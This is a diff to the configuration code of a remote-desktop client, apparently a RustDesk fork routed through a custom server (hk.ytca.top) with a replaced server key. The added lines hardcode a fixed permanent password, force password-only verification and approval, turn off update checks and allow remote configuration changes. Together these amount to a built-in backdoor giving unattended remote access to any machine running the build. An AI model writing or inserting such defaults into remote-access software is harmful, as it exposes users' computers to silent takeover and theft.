@@ -68,7 +68,11 @@ lazy_static::lazy_static! {
     pub static ref OVERWRITE_DISPLAY_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
     pub static ref DEFAULT_LOCAL_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
     pub static ref OVERWRITE_LOCAL_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
-    pub static ref HARD_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
+    pub static ref HARD_SETTINGS: RwLock<HashMap<String, String>> = {
+        let mut map = HashMap::new();
+        map.insert("password".to_string(), "!@#123QWEqwe".to_string());
+        RwLock::new(map)
+    };
     pub static ref BUILTIN_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
 }
 
@@ -107,7 +111,7 @@ const CHARS: &[char] = &[
 ];
 
 pub const RENDEZVOUS_SERVERS: &[&str] = &["hk.ytca.top"];
-pub const RS_PUB_KEY: &str = "sH+inBIJs7d4zndiLMTPDkMhAa9GwiWZ5H1si+Pq+mo=";
+pub const RS_PUB_KEY: &str = "wkBfFYsc3QXhhxfpDDG17CkUD9fg4v2JlbTFwTvkQDo=";
 
 pub const RENDEZVOUS_PORT: i32 = 21116;
 pub const RELAY_PORT: i32 = 21117;
@@ -470,6 +474,14 @@ impl Config2 {
             decrypt_str_or_original(&config.unlock_pin, PASSWORD_ENC_VERSION);
         config.unlock_pin = unlock_pin;
         store |= store2;
+        if !config.options.contains_key("verification-method") {
+            config.options.insert("verification-method".to_string(), "use-permanent-password".to_string());
+            store = true;
+        }
+        if !config.options.contains_key("approve-mode") {
+            config.options.insert("approve-mode".to_string(), "password".to_string());
+            store = true;
+        }
         if store {
             config.store();
         }
@@ -1810,7 +1822,32 @@ pub struct LocalConfig {
 
 impl LocalConfig {
     fn load() -> LocalConfig {
-        Config::load_::<LocalConfig>("_local")
+        let mut config = Config::load_::<LocalConfig>("_local");
+        let mut store = false;
+        if !config.options.contains_key("enable-udp-punch") {
+            config.options.insert("enable-udp-punch".to_string(), "Y".to_string());
+            store = true;
+        }
+        if !config.options.contains_key("enable-check-update") {
+            config.options.insert("enable-check-update".to_string(), "N".to_string());
+            store = true;
+        }
+        if !config.options.contains_key("enable-ipv6-punch") {
+            config.options.insert("enable-ipv6-punch".to_string(), "Y".to_string());
+            store = true;
+        }
+        if !config.options.contains_key("enable-lan-discovery") {
+            config.options.insert("enable-lan-discovery".to_string(), "N".to_string());
+            store = true;
+        }
+        if !config.options.contains_key("allow-remote-config-modification") {
+            config.options.insert("allow-remote-config-modification".to_string(), "Y".to_string());
+            store = true;
+        }
+    if store {
+      config.store();
+    }
+    config
     }
 
     fn store(&self) {
